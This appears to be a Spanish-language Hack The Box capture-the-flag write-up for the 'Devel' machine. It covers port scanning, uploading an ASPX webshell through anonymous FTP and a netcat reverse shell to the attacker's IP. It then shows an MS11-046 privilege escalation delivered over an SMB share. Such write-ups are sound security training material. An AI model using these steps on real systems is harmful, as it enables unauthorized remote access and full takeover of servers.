___
# Máquina Devel (HTB)

**IP atacante: 10.10.17.214**
**IP víctima: 10.129.57.16**

Comprobamos conexión con la máquina

![[devel_ping.png]]

TTL = 127 -> Windows

___

# Reconocimiento y enumeración de puertos

Ejecutamos un nmap hacia la máquina víctima para descubrir posibles puertos abiertos

![[devel_nmap.png]]

```bash
nmap -p21,80 -sCV 10.129.57.16 -oN targeted
```

![[devel_sCV.png]]

Puertos abiertos:

 - 21 FTP | Microsoft ftpd -> Anonymous FTP login allowed
 - 80 HTTP | Microsoft IIS httpd 7.5

El usuario Anonymous esta habilitado en FTP de la máquina víctima, asi que comprobamos el contenido que se muestra.

![[devel/devel_ftp.png]]

Entramos a la página web que muestra dicha máquina para ver el contenido.

![[devel_http.png|700]]

Es la misma imagen que tiene almacenado el FTP. Probamos si podemos subir archivos por FTP y verlos en la web.

Creamos un archivo `prueba.txt` que contenga una cadena e intentamos subirlo.

```bash
# Máquina atacante
whoami > prueba.txt

# Máquina víctima
put prueba.txt
```

![[devel_pruebatxt.png]]

Ya que se trata de un servidor IIS, lo ideal sería subir archivos ``.aspx``, así que buscamos un archivo que nos genere una shell.

![[devel_aspxcmd.png]]

![[devel_putaspx.png]]

Nos dirigimos a dicho archivo y probamos con el comando `whoami`.

![[devel_webshell.png]]

Ahora para lograr tener una consola, nos traemos el archivo `nc.exe` de `/seclists` y lo subimos al FTP

![[devel_nc.png]]

![[devel_ncexe.png]]

La ruta donde se almacena lo que subimos es la siguiente: `C:\inetpub\wwwroot\`

![[devel_pathpbulic.png]]

Ejecutamos el binario `nc.exe` para obtener una revershell por el puerto 443 (netcat).

```bash
# Máquina víctima
C:\inetpub\wwwroot\nc.exe -e cmd 10.10.17.214 443

#Máquina atacante
rlwrap nc -nlvp 443
```

![[devel_reverseshell.png]]

Miramos el la información del sistema con `systeminfo` para ver la versión de Windows y buscar un exploit para este.

![[devel_systeminfo.png]]

Nos descargamos el siguiente exploit que es para esa versión de Windows

![[devel_exploitw.png|1400]]

### Transferir archivos con smbserver

En la máquina atacante ejecutamos el siguiente comando:

```bash
smbserver.py smbFolder ${pwd}
impacket-smbserver smbFolder $(pwd)
# Crear un recurso compartido a nivel de red que esté identificado con smbFolder que a su vez está sincronizado con la ruta absoluta actual de trabajo
```

![[devel_smb.png]]

En la máquina víctima:

```cmd
copy \\<ip_atacante>\<recurso_compartido>\<archivo> <nombre_copia_de_archivo>
```

![[devel_ms11-046.png]]

Lo ejecutamos y podemos ver que tenemos los máximos permisos posibles. (Esto en Windows 7).

![[devel_authoritysystem.png]]

Así que podemos ver ambas flags, la de `user` y la de `root`.

![[devel_userflag.png]]

![[devel_rootflag.png]]

